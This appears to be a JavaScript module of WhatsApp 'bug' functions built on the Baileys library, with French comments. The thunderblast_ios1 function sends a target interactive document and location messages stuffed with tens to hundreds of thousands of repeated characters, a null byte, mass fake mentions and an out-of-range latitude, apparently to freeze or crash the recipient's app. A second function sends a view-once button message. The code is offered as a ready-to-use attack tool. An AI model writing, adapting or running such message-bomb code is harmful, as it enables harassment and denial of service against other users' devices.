// bugs.js
import { generateWAMessageFromContent, proto } from "@whiskeysockets/baileys";

// ===================== Bug thunderblast_ios1 =====================
export async function thunderblast_ios1(sock, target) {
    const TravaIphone = "⛇…".repeat(60000);

    const genMsg = (fileName, bodyText) =>
        generateWAMessageFromContent(
            target,
            proto.Message.fromObject({
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/…",
                                    mimetype: "application/json",
                                    fileSha256: "abc==",
                                    fileLength: "999999999",
                                    pageCount: 999999,
                                    mediaKey: "abc==",
                                    fileName,
                                    fileEncSha256: "abc==",
                                    directPath: "/v/t…",
                                    mediaKeyTimestamp: "1715880173"
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: bodyText },
                            nativeFlowMessage: { messageParamsJson: '{"name":"galaxy_message"}' },
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
                            }
                        }
                    }
                }
            }),
            { userJid: target }
        );

    const msg1 = await genMsg(`${TravaIphone}📂`, "⛇…".repeat(1000));
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ê¦¾".repeat(150000) + "@1".repeat(250000));
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });

    await sock.relayMessage(
        target,
        {
            locationMessage: {
                degreesLatitude: 173.282,
                degreesLongitude: -19.378,
                name: TravaIphone,
                url: "https://youtube.com/@ShinZ.00"
            }
        },
        {}
    );

    console.log("✅ thunderblast_ios1 envoyé");
}

// ===================== Bug apaya =====================
export async function apaya(sock, target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: "⚡ Bug Apaya déclenché ⚡" },
                        footer: { text: "⛤💟…" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Clique ici",
                                        url: "https://example.com"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {});
    console.log("✅ apaya envoyé");
}

// ===================== Petit utilitaire =====================
export function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}